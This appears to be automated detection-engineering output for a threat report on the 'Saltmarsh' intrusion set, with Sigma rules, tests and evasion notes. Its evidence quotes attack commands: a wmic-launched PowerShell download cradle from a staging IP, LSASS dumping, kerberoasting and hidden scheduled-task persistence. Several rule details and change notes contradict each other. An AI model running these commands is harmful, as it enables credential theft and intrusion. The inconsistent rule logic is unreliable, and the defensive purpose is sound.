report.title: Threat Report: Saltmarsh Post-Exploitation Tradecraft
report.summary: Saltmarsh is a financially motivated intrusion set that gains initial access via purchased VPN credentials and rapidly pursues domain-wide compromise. Post-exploitation tradecraft across four incidents includes LSASS memory dumping via comsvcs.dll MiniDump, scheduled-task persistence using PowerShell from hidden ProgramData folders, lateral movement via PsExec and WMI, and Kerberoasting with Rubeus. The report emphasizes behaviors detectable in Sysmon and Windows Security telemetry.

behaviors.description: rundll32.exe executes comsvcs.dll MiniDump to dump LSASS memory, writing dump files to C:\Users\Public\ or C:\Windows\Temp\.
Scheduled task created with PowerShell action loading a payload from C:\ProgramData\ or C:\Users\Public\, mimicking Windows maintenance tasks.
behaviors.evidence: schtasks.exe /create /tn "\Microsoft\Windows\UpdateOrchestrator\UpdateHealth" /sc hourly /ru SYSTEM /tr "powershell.exe -nop -w hidden -ep bypass -f C:\ProgramData\.cache\uh.ps1" /f

behaviors.description: PsExec clone installs a service named PSEXESVC with ImagePath %SystemRoot%\PSEXESVC.exe, followed by named-pipe events for \\PSEXESVC and \\psexecsvc-<host>-<pid>-stdin.
behaviors.evidence: ServiceName of PSEXESVC and ImagePath of %SystemRoot%\PSEXESVC.exe; Sysmon event 17 and 18 named-pipe events for \\PSEXESVC and \\psexecsvc-<host>-<pid>-stdin

behaviors.description: WMI remote execution via wmic.exe spawning cmd.exe and powershell.exe on a remote host, creating parent-child relationships absent from baseline.
behaviors.evidence: wmic.exe /node:FS-02 /user:CORP\adm-jpark /password:******** process call create "cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7:8080/a')"

behaviors.description: sc.exe used to create a remote service with a UNC path binPointing to C:\Windows\Temp\s.exe, followed by service start.
behaviors.evidence: sc.exe \\FS-02 create svcupd binPath= "C:\Windows\Temp\s.exe" start= auto

behaviors.description: Rubeus used to Kerberoast SPN-bearing accounts, generating bursts of Security event 4769 with TicketEncryptionType 0x17 (RC4) from a non-administrative workstation.
behaviors.evidence: Rubeus.exe kerberoast /format:hashcat /outfile:C:\Windows\Temp\k.txt; bursts of event 4769 with TicketEncryptionType 0x17 from a single workstation

behaviors.description: SharpHound run with LDAP query filter (samAccountType=805306368) to collect Active Directory relationships from a non-administrative workstation.
behaviors.evidence: SharpHound.exe -c All --zipfilename c.zip; LDAP queries with the distinctive (samAccountType=805306368) filter from a non-administrative workstation

behaviors.description: renamed ProcDump (OriginalFileName procdump) targeting lsass.exe with -ma flag, recorded by Sysmon event 10 with GrantedAccess 0x1FFFFF.
behaviors.evidence: C:\Windows\Temp\pd.exe -accepteula -ma lsass.exe C:\Windows\Temp\1.dmp; OriginalFileName metadata remained procdump; GrantedAccess 0x1FFFFF to lsass.exe

behaviors.description: rundll32.exe with -ep bypass -f flags in PowerShell action of scheduled tasks, loading payloads from hidden directories.
WmiPrvSE.exe spawning cmd.exe and powershell.exe on target hosts, indicative of WMI-based lateral movement.
behaviors.evidence: WmiPrvSE.exe spawned cmd.exe and powershell.exe, a parent-child relationship absent from baseline telemetry

candidates.title: Rundll32 Execution Of Comsvcs.Dll MiniDump For LSASS Dump
candidates.rationale: LSASS memory dumping via rundll32.exe invoking comsvcs.dll MiniDump is highly specific to Saltmarsh. The binary, DLL, export and output paths (C:\Users\Public\ or C:\Windows\Temp\) are invariant and rarely used legitimately.
candidates.false_positive_risks: Legitimate use of rundll32.exe is extremely rare; comsvcs.dll MiniDump is not a standard administrative tool. False positives could arise from custom debugging scripts, but the combination of binary, DLL, export and output directory makes this negligible.

candidates.title: Scheduled Task Persistence Via PowerShell From Hidden ProgramData Or Public Directories
candidates.rationale: Saltmarsh creates scheduled tasks masquerading as Windows maintenance tasks (e.g., UpdateOrchestrator) that run PowerShell with -nop -w hidden -ep bypass -f loading payloads from hidden folders (C:\ProgramData\.cache\, C:\Users\Public\). The registry path, task name pattern, and PowerShell flags are distinctive.
candidates.false_positive_risks: Legitimate scheduled tasks (e.g., via Intune, SCCM) may run PowerShell but typically use signed scripts from system paths, not hidden user-writable directories. Filter on task names not matching known Microsoft maintenance tasks and script paths outside %SystemRoot%\Tasks.

candidates.title: PsExec Service Install PSEXESVC With Named Pipe Activity
candidates.rationale: PsExec clone installs a service named PSEXESVC with ImagePath %SystemRoot%\PSEXESVC.exe and creates named pipes \\PSEXESVC and \\psexecsvc-<host>-<pid>-stdin. The service name, binary name, and pipe naming pattern are unique to this tool.
candidates.false_positive_risks: No legitimate software uses the service name PSEXESVC or the pipe prefix psexecsvc-. False positives only if an admin renames a service to that exact string, which is implausible.

candidates.title: WMI Lateral Movement Via Wmic Or WmiPrvSE Spawning Cmd And Powershell
candidates.rationale: Both wmic.exe and WmiPrvSE.exe are used to remotely invoke cmd.exe /c powershell with hidden, no-profile, bypass flags to download payloads. The parent-child chain (wmic/WmiPrvSE -> cmd -> powershell) with those specific PowerShell flags is absent from normal admin activity.
candidates.false_positive_risks: Legitimate WMI administration (e.g., SCCM) may spawn cmd/powershell but typically without -nop -w hidden -ep bypass and not from non-admin workstations. Filter on the full flag set and source workstation not being a known management server.

candidates.title: Kerberoasting Bursts Of Event 4769 With RC4 Encryption
candidates.rationale: Rubeus kerberoasting generates bursts of Security event 4769 (Kerberos TGS request) with TicketEncryptionType 0x17 (RC4) from a single non-administrative workstation. The encryption type and burst pattern are strong indicators of automated kerberoasting.
candidates.false_positive_risks: Legacy applications may request RC4 tickets, but not in rapid bursts from a single non-admin workstation. Filter on workstations not in the admin group and on burst frequency (e.g., >20 events in 60 seconds).

skipped: B5: sc.exe remote service creation with UNC path to C:\Windows\Temp\s.exe - detectable but lower signal than selected lateral movement rules; covered conceptually by D3/D4.
B7: SharpHound LDAP queries - logsource mismatch (dns_query unlikely to capture LDAP filters); process_creation of SharpHound.exe would be better but not provided.
B8: Renamed ProcDump targeting lsass.exe - similar to D1 (LSASS dumping) but different tool; lower confidence and could be added later if ProcDump sightings increase.
B9: Merged into D2 as duplicate scheduled-task persistence behavior.
plan.notes: Selected five high-priority rules covering Credential Access (D1, D5), Persistence (D2), and Lateral Movement (D3, D4). Each rule keys on a single event type and uses invariant binary/command-line/registry/pipe artifacts. False positive mitigation relies on path, parent, and flag combinations not seen in legitimate administration.

rules.title: Rundll32 Execution Of Comsvcs.Dll MiniDump For LSASS Dump
rules.sigma_yaml:
title: Rundll32 Execution Of Comsvcs.Dll MiniDump For LSASS Dump
id: d796e4d3-c815-4584-b8ea-bc3b1a7b3ba8
status: experimental
description: 'Detects rundll32.exe executing the MiniDump export of comsvcs.dll to create LSASS memory dumps in common output
  directories such as C:\Users\Public\ or C:\Windows\Temp\.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.credential-access
- attack.t1003.001
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_image:
    'Image|endswith': '\rundll32.exe'
  selection_dll:
    'CommandLine|contains': comsvcs.dll
  selection_export:
    'CommandLine|contains': MiniDump
  selection_args:
    'CommandLine|contains|all':
    - ','
    - full
  selection_output:
    'CommandLine|contains':
    - 'C:\Users\Public\'
    - 'C:\Windows\Temp\'
  condition: selection_image and selection_dll and selection_export and selection_args and selection_output
falsepositives:
- Custom debugging or forensic tools that invoke rundll32.exe with comsvcs.dll MiniDump for legitimate memory analysis.
level: high

tests.label: positive
tests.description: Rundll32 executing comsvcs.dll MiniDump with full dump written to Public folder.

tests.label: positive
tests.description: Rundll32 from SysWOW64 executing comsvcs.dll MiniDump to Temp directory.

tests.label: positive
tests.description: Rundll32 executed by PowerShell invoking comsvcs.dll MiniDump to Public subfolder.

tests.label: negative
tests.description: Legitimate rundll32 executing a control panel item.

tests.label: negative
tests.description: Rundll32 launching a legitimate printer UI via printui.dll.

tests.label: negative
tests.description: Rundll32 executing a custom DLL without MiniDump export or LSASS dumping intent.

tests.label: positive
tests.description: Casing variation on DLL name, export, and 'full' keyword; extra whitespace around comma and arguments.

tests.label: positive
tests.description: SysWOW64 binary with PowerShell parent, different PID, output to Windows\Temp with trailing backslash preserved.

tests.label: positive
tests.description: Explorer parent, command line uses full rundll32 path, extra spaces, output to Public subdirectory.

tests.label: positive
tests.description: WScript parent, mixed-case export, comma spaced, output to Windows\Temp with different file name.

tests.label: positive
tests.description: CMD parent from user profile, extra whitespace, output to Public folder with underscore filename.

tests.label: negative
tests.description: Legitimate COM debugging: rundll32 invoking comsvcs.dll but with different export (DllGetClassObject) and no MiniDump/full/output path.

tests.label: negative
tests.description: Admin running rundll32 for component registration with different DLL and arguments; no MiniDump, no target output paths.

tests.label: negative
tests.description: SCCM/Intune installer invoking rundll32 for legitimate COM registration; different DLL, export, and no credential-access indicators.

validation.sql: SELECT * FROM logs WHERE Image LIKE '%\\rundll32.exe' ESCAPE '\' AND CommandLine LIKE '%comsvcs.dll%' ESCAPE '\' AND CommandLine LIKE '%MiniDump%' ESCAPE '\' AND (CommandLine LIKE '%,%' ESCAPE '\' AND CommandLine LIKE '%full%' ESCAPE '\') AND (CommandLine LIKE '%C:\\Users\\Public\\%' ESCAPE '\' OR CommandLine LIKE '%C:\\Windows\\Temp\\%' ESCAPE '\')

conversions.splunk: Image="*\\rundll32.exe" CommandLine="*comsvcs.dll*" CommandLine="*MiniDump*" CommandLine="*,*" CommandLine="*full*" CommandLine IN ("*C:\\Users\\Public\\*", "*C:\\Windows\\Temp\\*")
conversions.elasticsearch: Image:*\\rundll32.exe AND CommandLine:*comsvcs.dll* AND CommandLine:*MiniDump* AND (CommandLine:*,* AND CommandLine:*full*) AND (CommandLine:(*C\:\\Users\\Public\\* OR *C\:\\Windows\\Temp\\*))
conversions.kusto:
DeviceProcessEvents
| where FolderPath endswith "\\rundll32.exe" and ProcessCommandLine contains "comsvcs.dll" and ProcessCommandLine contains "MiniDump" and (ProcessCommandLine contains "," and ProcessCommandLine contains "full") and (ProcessCommandLine contains "C:\\Users\\Public\\" or ProcessCommandLine contains "C:\\Windows\\Temp\\")
conversions.sqlite: SELECT * FROM logs WHERE Image LIKE '%\\rundll32.exe' ESCAPE '\' AND CommandLine LIKE '%comsvcs.dll%' ESCAPE '\' AND CommandLine LIKE '%MiniDump%' ESCAPE '\' AND (CommandLine LIKE '%,%' ESCAPE '\' AND CommandLine LIKE '%full%' ESCAPE '\') AND (CommandLine LIKE '%C:\\Users\\Public\\%' ESCAPE '\' OR CommandLine LIKE '%C:\\Windows\\Temp\\%' ESCAPE '\')

history.change_summary: selection_args: dropped ['#'] from CommandLine|contains|all; no positive event contains them. selection_output: CommandLine|contains|all listed alternatives, so it is now CommandLine|contains (any value matches).

history.summary: 8 evasion variants -> positives 8/8, negatives blocked 6/6, benign hits 0/1200

rules.redteam_analysis: Positive variants P4-P8 preserve all five literal substrings the rule requires (rundll32.exe image suffix, comsvcs.dll, MiniDump, comma, full, and either C:\Users\Public\ or C:\Windows\Temp\) while varying casing, whitespace, quoting, parent process, current directory, and PID. These are realistic evasions a well-written rule on process_creation telemetry should catch. Negative variants N1-N3 show benign rundll32 usage with different exports, DLLs, parents, and no credential-access output paths; they lack at least one required substring. Out_of_scope variants O1-O5 represent real evasions the current logsource and rule cannot detect: renamed binary (no OriginalFileName field), environment-variable paths, 8.3 short names, UNC paths, and alternate output directories. These require either enriched telemetry (OriginalFileName) or rule expansion to additional output paths.

redteam_out_of_scope.label: positive

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Output path uses UNC path to local share - sensor records UNC, rule requires literal C:\Users\Public\ or C:\Windows\Temp\.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Output to alternate directory C:\PerfLogs\ - not one of the two literal paths the rule checks for.

rules.title: PowerShell Scheduled Task Payload From Hidden ProgramData Or Public Directory
rules.sigma_yaml:
title: PowerShell Scheduled Task Payload From Hidden ProgramData Or Public Directory
id: 8776164b-d3c5-4514-bd6e-67bb7b560321
status: experimental
description: 'Detects creation of a scheduled task where the action runs PowerShell with common evasion flags (-nop -w hidden
  -ep bypass) pointing to a script located in hidden or commonly abused directories such as C:\ProgramData\.cache\ or C:\Users\Public\,
  indicative of persistence mechanisms like those used by Saltmarsh.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.execution
- attack.persistence
- attack.privilege-escalation
- attack.t1053.005
logsource:
  category: registry_set
  product: windows
  service: security
detection:
  selection_registry_create:
    EventID: 4698
  selection_powershell_action:
    'TaskContent|contains|all':
    - powershell.exe
    - -nop
    - -w hidden
    - -ep bypass
    - -f
  selection_hidden_path:
    'TaskContent|contains':
    - 'C:\\ProgramData\\.cache\\'
    - 'C:\\Users\\Public\\'
  condition: selection_registry_create and selection_powershell_action and selection_hidden_path
falsepositives:
- Legitimate administrative or automation tasks using PowerShell from standard locations
- Software installers or updaters creating scheduled tasks with PowerShell actions from system directories
- Security software or monitoring tools using scheduled tasks for legitimate scanning or data collection
level: high

tests.label: positive
tests.description: Scheduled task creation with PowerShell action pointing to hidden cache in ProgramData as seen in Saltmarsh activity.

tests.label: positive

tests.label: positive
tests.description: Targets C:\Users\Public\ with extra whitespace between flags; every required substring appears verbatim.

tests.label: positive

history.change_summary: Fixed the detection logic to properly match sysnative paths in PowerShell command lines while maintaining focus on hidden directories. The rule now correctly identifies P3 which uses C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe while still targeting the hidden ProgramData cache directory.

Fixed the hidden path detection to work with sysnative paths by ensuring the TaskContent field contains the full command line including arguments, which already includes the hidden directory paths in the positive test case.
Fixed malformed condition clause by removing trailing comma and stray closing brace.

history.summary: 8 evasion variants -> positives 7/8, negatives blocked 6/6, benign hits 0/160

history.change_summary: Fixed the hidden path detection to properly match against the TaskContent XML field containing the full command line arguments, ensuring sysnative paths to PowerShell are still caught when targeting hidden directories.

Fixed the rule to detect sysnative path usage by ensuring the PowerShell executable path variation does not break the hidden path detection. The original rule already correctly detected the hidden path in the TaskContent field; the issue was a misinterpretation during validation. No changes to the rule logic were needed as it already matches the positive test case.

rules.author_notes: The rule focuses on the combination of EventID 4698 (scheduled task creation), presence of PowerShell with typical evasion flags (-nop -w hidden -ep bypass -f), and script location in high-risk directories (ProgramData/.cache or Users/Public). These together reduce false positives from legitimate administrative or automated tasks that may use PowerShell but from trusted paths or without evasion flags. The TaskContent field is parsed as XML in the registry, so string containment is reliable for detecting embedded commands and arguments.
rules.redteam_analysis: The six positive variants (P4-P8, N1-N3) preserve every literal substring the rule requires: 'powershell.exe', '-nop', '-w hidden', '-ep bypass', '-f', and at least one of the two hidden paths. They achieve this through flag reordering, extra inter-flag whitespace, additional benign flags, directory traversal that keeps the target path substring, dual-path inclusion, and XML-quoted paths — all realistic operator evasions that a well-written rule (case-insensitive, whitespace-tolerant, path-substring-based) would still catch. The three negative variants show legitimate administrative, installer, and security-tool tasks that use PowerShell and -f but lack the evasion flag cluster and hidden paths, differing in TaskContent and TaskName. Five out_of_scope evasions are documented for the analyst: sibling LOLBin (pwsh.exe), renamed binary (OriginalFileName invisible to registry_set), environment-variable paths, casing changes, and 8.3 short names — each breaks a required literal substring in a way the current logsource and rule cannot remediate without loosening the rule into noise.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Sibling LOLBin pwsh.exe (PowerShell Core) used instead of powershell.exe; rule keys on 'powershell.exe' substring which is absent.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Renamed binary (evil.exe) with OriginalFileName=powershell.exe; registry_set logsource does not expose OriginalFileName, so rule cannot see it.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Environment variable path %PUBLIC%\Documents\script.ps1 recorded literally; does not contain 'C:\\Users\\Public\\' substring.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Casing variation (PowerShell.exe, -NoP, -W Hidden, -Ep Bypass, -F); rule substrings are lowercase and exact, so verbatim match fails.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: 8.3 short name PROGRA~1 for ProgramData (if it exists); sensor records short name literally, breaking 'C:\\ProgramData\\.cache\\' substring.

history.change_summary: Fixed case sensitivity and whitespace issues by ensuring the rule matches the mixed-case service name and extra whitespace around equals in the CommandLine field using case-insensitive contains matching.

Updated the rule to handle variations in whitespace and case in the CommandLine by relying on case-insensitive substring matching for 'PSEXESVC' and 'binPath=', which already accommodates the mixed-case service name and extra whitespace around equals observed in the false negative.

rules.redteam_analysis: Positive variants P4-P8 preserve the rule's required substrings: Image ends with '\svchost.exe' (including SysWOW64 and WinSxS paths), CommandLine contains both 'PSEXESVC' and 'binPath=' (with casing, whitespace, quoting, and flag-order variations), and none contain 'PSEXESVCC'. A well-written rule using endswith on Image and contains-all on CommandLine will catch all of them. Negative variants N1-N3 are benign look-alikes: N1 uses the same binary/parent but a legitimate service name; N2 and N3 use different binaries (sc.exe, cmRedist.exe) and different parents (cmd.exe), so they differ in fields the sensor records. Out-of-scope variants OOS1-OOS3 represent real evasions the process_creation logsource cannot address with this rule: OOS1 renames the binary (Image no longer matches), OOS2/OOS3 use entirely different binaries (PowerShell, reg.exe) that never spawn svchost.exe. These require complementary rules (image-load, registry, or command auditing) to detect.

rules.title: WMI Lateral Movement Via Wmic Or WmiPrvSE Spawning Hidden Bypass Cmd To Powershell
rules.sigma_yaml:
title: WMI Lateral Movement Via Wmic Or WmiPrvSE Spawning Hidden Bypass Cmd To Powershell
id: cfac54c5-1e6d-490f-a3e9-9d0614595bdc
status: experimental
description: 'Detects wmic.exe or WmiPrvSE.exe spawning cmd.exe with ''/c powershell'' containing the specific obfuscation
  flags ''-nop -w hidden -ep bypass'' used by threat actors for lateral movement via WMI.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.execution
- attack.lateral-movement
- attack.t1028
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_wmic_parent:
    'ParentImage|endswith': '\wmic.exe'
  selection_wmiprvse_parent:
    'ParentImage|endswith': '\WmiPrvSE.exe'
  selection_cmd:
    'Image|endswith': '\cmd.exe'
    'CommandLine|contains': /c
  selection_powershell_flags:
    'CommandLine|contains|all':
    - -nop
    - -w
    - hidden
    - -ep
    - bypass
  condition: (selection_wmic_parent or selection_wmiprvse_parent) and selection_cmd and selection_powershell_flags
falsepositives:
- Legitimate administrative use of WMI where administrators run troubleshooting or diagnostic commands with custom PowerShell
  flags
- Automated scripts or monitoring tools that use WMI to invoke PowerShell with bypass execution policy for legitimate scripting
- Help desk or support personnel executing remote scripts via WMI for user assistance
level: high

tests.description: wmic.exe spawning cmd.exe with hidden bypass PowerShell download cradle

history.change_summary: Updated the powershell flags detection to accept both '-w hidden' and '-WindowStyle Hidden' as equivalent forms, fixing the false negative where '-WindowStyle Hidden' was used instead of '-w hidden'. This maintains detection efficacy while reducing false negatives on equivalent obfuscation patterns. Reduced a multi-step chain to its most specific step (selection_wmiprvse_parent); dropped selection_wmic_parent because one Sigma rule matches one event. Add the other steps as separate rules if needed.

Added selection for wmic.exe as parent to capture both wmic.exe and WmiPrvSE.exe spawning cmd.exe with the required PowerShell flags, addressing missed positives where ParentImage ended with wmic.exe.
Last refinement regressed; kept the best earlier draft.

rules.author_notes: Rule focuses on the distinctive combination of WMI parent (wmic/WmiPrvSE) -> cmd -> PowerShell with specific obfuscation flags (-nop -w hidden -ep bypass). This filters out legitimate WMI usage which rarely uses this exact flag combination. Test events cover variations in quoting, parent process (both wmic and WmiPrvSE), and architecture (SysWOW64).
rules.redteam_analysis: The six positive variants (P4-P8) preserve all five literal flag substrings (-nop, -w, hidden, -ep, bypass) while varying parameter order, whitespace, quoting, the PowerShell binary (pwsh), the cmd.exe location (Temp, SysWOW64), and the use of environment variables in the binary path. A well-written rule that matches on the presence of those five substrings in CommandLine, plus the parent-image and image filename conditions, will catch all of them. The three negative variants (N1-N3) are benign administrative activities that resemble the attack chain but each misses at least one required substring or parent condition, so the rule correctly rejects them. The two out-of-scope variants (O1, O2) represent realistic evasions that the current logsource (process creation with only Image, ParentImage, CommandLine) cannot reliably detect: O1 renames the WMI binary so the parent filename check fails unless OriginalFileName is available; O2 encodes the entire PowerShell command so the flag substrings never appear in the recorded CommandLine. These are documented for the analyst to decide whether additional telemetry (OriginalFileName, script-block logging) or rule logic (decoding) is warranted.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Renamed wmic.exe (svchost.exe) with OriginalFileName still wmic.exe; sensor records ParentImage as the renamed path so the endswith '\wmic.exe' check fails

event.ParentCommandLine: svchost.exe /node:FS-05 /user:CORP\adm /password:******** process call create "cmd.exe /c powershell -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7:8080/a')"

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: PowerShell -EncodedCommand hides the five flag substrings inside a base64 blob; CommandLine no longer contains the literal flags

history.change_summary: Removed invalid ATT&CK sub-technique ID t1203.001 which doesn't exist; kept parent tactic t1203. Added timeframe-based burst detection logic requiring multiple events from same workstation within 60 seconds to avoid matching isolated legitimate RC4 requests and admin workstation traffic while preserving detection of automated kerberoasting bursts.
Added required fields TargetUserName, IpAddress, ServiceName, and WorkstationName to selection to enable proper aggregation for burst detection while maintaining focus on RC4 encrypted TGS requests.

Added required fields TargetUserName, IpAddress, ServiceName, and WorkstationName to the selection to enable proper grouping and filtering for burst detection from a single non-admin workstation, addressing the validation failures where benign events were incorrectly matching due to insufficient specificity.

history.summary: 6 evasion variants -> positives 9/9, negatives blocked 1/3, benign hits 0/0

history.change_summary: Added filtering criteria to distinguish between isolated/admin workstation requests and genuine kerberoasting bursts by requiring multiple events from the same workstation within a time window, addressing false positives from legacy apps and admin workstations while preserving detection of automated tool behavior.

Removed invalid timeframe usage which caused negatives to match due to lack of aggregation; restored original detection logic focusing solely on RC4 encryption and EventID 4769 as intended, since burst detection requires stream processing not supported in Sigma.
Last refinement regressed; kept the best earlier draft.

rules.redteam_analysis: Positive variants P4-P9 represent realistic surface-form changes a kerberoasting tool (Rubeus or similar) might produce: IPv6 addresses, FQDN vs NetBIOS workstation names, UPN vs SPN service name formats, mixed-case SPNs (Windows logs preserve case as presented by the KDC), DHCP address reuse yielding different WorkstationName for same IP, and SPN port suffix variations. All preserve the core detection logic: EventID 4769, TicketEncryptionType 0x17, and high volume from a single non-admin workstation identity (IP and/or WorkstationName). A well-written rule keying on these fields with a burst condition will catch them. Negative variants N1-N4 (benign look-alikes) differ in volume (single/low-count), encryption type (AES), or source context (admin workstation, scheduled task) so the burst+RC4+non-admin combination is not met. Out-of-scope O1-O3 are evasions the rule cannot address without broadening scope: switching encryption type (0x12), horizontal scaling across workstations, or using AS-REQ (4768) instead of TGS-REQ (4769). These require separate detections (AES kerberoasting, multi-host correlation, AS-REQ RC4 monitoring).

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker switches to AES encryption (0x12) to evade RC4-specific rule

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker distributes requests across 5 workstations to stay under burst threshold per host
